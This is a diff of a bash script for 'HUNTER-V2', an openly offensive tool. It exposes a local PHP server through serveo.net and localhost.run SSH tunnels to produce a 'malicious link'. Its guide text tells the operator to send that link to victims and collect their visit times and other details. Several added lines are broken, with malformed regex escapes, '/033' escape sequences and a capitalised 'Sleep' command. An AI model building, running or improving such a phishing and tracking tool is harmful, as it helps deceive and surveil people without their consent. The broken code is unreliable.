-        mal_link=$(grep -o "https://[a-z0-9A-Z.-]*\.serveo\.net" maliciouslink | head -n 1)
+        mal_link=$(grep -o "https://[a-z0-9A-Z.-]*\serveo.net" maliciouslink | head -n 1)      #
         rm -rf maliciouslink
         sleep 2
     else
-        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!\033[0m\n"
-        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some.\033[0m\n"
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some./033[0m\n"
         rm -rf maliciouslink
         exit 1
     fi
@@ -740,17 +723,17 @@ function localXposer()
 
     printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
 
-    port=$(lsof -t -i:31301 -sTCP:LISTEN 2>/dev/null)
-    if [[ -n $port ]]; then
-        kill -9 "$port" > /dev/null 2>&1
-    fi
+    # pid=$(pidof php)
+    # kill $pid > /dev/null 2>&1    //kill running process by PID
     
+    port=$(lsof -t -i:31301 -sTCP:LISTEN)
+    kill -9 $port > /dev/null 2>&1 #kill running process by port listener
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting localhost.run";loading
-    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "${subdomain}:80:localhost:31301" nokey@localhost.run 2> sshError > maliciouslink &
-    sleep 10
+    ssh -o StrictHostKeyChecking=no -R 80:localhost:31301 nokey@localhost.run 2> sshError > maliciouslink &
+    sleep 7
 
     if [[ -e sshError ]]; then
         conn=$(grep -a "Connection refused" sshError)
@@ -784,12 +767,12 @@ function localXposer()
     sleep 3
 
     if [[ -s maliciouslink ]]; then
-        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.lhr\.life" maliciouslink | head -n 1)
+        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.lhr.life" maliciouslink | head -n 1)   #
         rm -rf maliciouslink
         sleep 2
     else
-        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!\033[0m\n"
-        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some.\033[0m\n"
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some./033[0m\n"
         rm -rf maliciouslink
         exit 1
     fi
@@ -873,7 +856,7 @@ function guide()
     printf "\033[1;33m[\033[1;37mStep 6\033[1;33m] Next we gonna generate the malicious link, which will be use to lauch the attack.\n"
     printf "\033[1;33m[\033[1;37mStep 7\033[1;33m] We will setup the template which will be then use to attract the victims attention.\n"
     printf "\033[1;33m[\033[1;37mStep 8\033[1;33m] A malicious link will be displayed on the screen other wise an error will be shown instead.\n"
-    printf "\033[1;33m[\033[1;37mStep 9\033[1;33m] If the malicious link is generated successfully, we will display a message showing that we'\''re waiting for victims.\n"
+    printf "\033[1;33m[\033[1;37mStep 9\033[1;33m] If the malicious link is generated successfully, we will display a message showing that we're waiting for victims.\n"
     printf "\033[1;33m[\033[1;37mStep 10\033[1;33m] Copy and forword the malicious link to ur victims, and prompt them to visit the link.\n"
     printf "\033[1;33m[\033[1;37mStep 11\033[1;33m] We will detect when ever the victims visit our malicious link, and also forword date, time and the victims.\n"
     printf "\033[1;33m[\033[1;37mStep 12\033[1;33m] Other informations will be displayed such as.\n\n"
@@ -891,16 +874,6 @@ function guide()
     echo -e '\n\033[0m'
 }
 
-function updateUS()
-{
-    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Checking for updates...\n"
-    sleep 2
-    printf "\033[1;33m[\033[1;37m++\033[1;33m] You are using the latest version.\n"
-    sleep 2
-    printf "\033[1;33m[\033[1;37m++\033[1;33m] Redirecting to main menu...";loading
-    hunter
-}
-
 function menu()
 {
     sleep 1
@@ -912,15 +885,16 @@ function menu()
     printf "   \033[1;33m[\033[1;37m05\033[1;33m] Launch an Attack\n\n"
     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose an Action to Perform:\033[1;37m ' act
 
+    # if [[ $act -lt "1"]] || if [[ $act -gt "5"]]; then
     if [[ -z  $act ]]; then
-        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Action Can'\''t be Empty!\n"
+        printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Action Can't be Empty!\n"
         printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Option!\033[0m\n"
         sleep 2
         menu
     fi
 
     if [[ $act == 1 ]] || [[ $act == 01 ]]; then
-        sleep 2
+        Sleep 2
         printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Hope you enjoy using \033[1;37mHUNTER-V2\033[1;31m.\033[0m\n"
         redirection
     elif [[ $act == 2 ]] || [[ $act == 02 ]]; then
@@ -954,3 +928,4 @@ function hunter()
 }
 
 hunter
+
